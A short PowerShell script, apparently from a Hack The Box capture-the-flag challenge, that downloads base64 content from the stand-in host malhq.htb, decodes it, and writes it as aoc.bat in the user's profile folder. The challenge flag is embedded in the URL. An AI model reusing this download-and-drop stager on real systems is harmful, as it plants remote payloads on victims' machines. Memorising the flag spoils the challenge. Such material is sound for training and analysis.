$anaba = Join-Path $env:USERPROFILE 'aoc.bat'
$uri    = 'http://malhq.htb/HTB{34dsy_d30bfusc4t10n_34sy_d3t3ct10n}'

Try {
    Write-Host "Downloading from $uri ..."
    $resp = Invoke-WebRequest -Uri $uri -UseBasicParsing -ErrorAction Stop

    $b64 = $resp.Content
    if (-not $b64) {
        throw "Empty response from $uri"
    }

    $b64 = ($b64 -replace '\s', '')

    $bytes = [Convert]::FromBase64String($b64)

    $oddCount = 0
    $oddZeroCount = 0
    for ($i = 1; $i -lt $bytes.Length; $i += 2) {
        $oddCount++
        if ($bytes[$i] -eq 0) { $oddZeroCount++ }
    }
    $oddZeroRatio = if ($oddCount -gt 0) { $oddZeroCount / $oddCount } else { 0 }

    if ($oddZeroRatio -ge 0.55) {
        $decoded = [Text.Encoding]::Unicode.GetString($bytes)
        Set-Content -Path $anaba -Value $decoded -Encoding Unicode -Force
        Write-Host "Decoded content looks like UTF-16LE text. Written to $anaba using Unicode encoding."
    } else {
        [System.IO.File]::WriteAllBytes($anaba, $bytes)
        Write-Host "Decoded content written as raw bytes to $anaba."
    }
}
catch {
    Write-Error "Operation failed: $($_.Exception.Message)"
}
